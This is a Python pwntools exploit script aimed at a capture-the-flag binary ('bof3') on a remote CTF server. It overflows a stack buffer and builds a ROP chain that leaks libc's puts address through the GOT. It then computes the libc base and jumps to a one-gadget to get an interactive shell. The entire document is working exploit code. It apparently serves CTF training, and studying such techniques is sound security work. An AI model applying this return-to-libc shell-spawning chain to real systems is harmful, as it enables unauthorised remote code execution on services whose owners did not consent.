from pwn import *
import binascii

context.arch = 'amd64'

puts_plt = 0x4004a0
puts_got = 0x601018
pop_rdi = 0x400673
main = 0x4005b7

libc_puts = 0x809c0
libc_exec = 0x4f2c5
libc_pop_rcx = 0x3eb0b

r = remote('csie.ctf.tw',10127)
#r = process('./bof3')

###leak libc base
ropchain = b'\x90'*16
ropchain += p64(pop_rdi)
ropchain += p64(puts_got)
ropchain += p64(puts_plt)   # address 
ropchain += p64(main)
r.sendline(ropchain)

####parse libc_base
r.recvuntil('\n')
leak_puts = u64(r.recvuntil('\n').strip().ljust(8,b'\x00'))
libc_base = leak_puts-libc_puts

####syscall
ropchain = b'\x90'*16
ropchain += p64(libc_pop_rcx+libc_base)
ropchain += p64(0x0)
ropchain += p64(libc_exec+libc_base)
r.sendline(ropchain)
r.recvuntil('\n')
r.interactive()
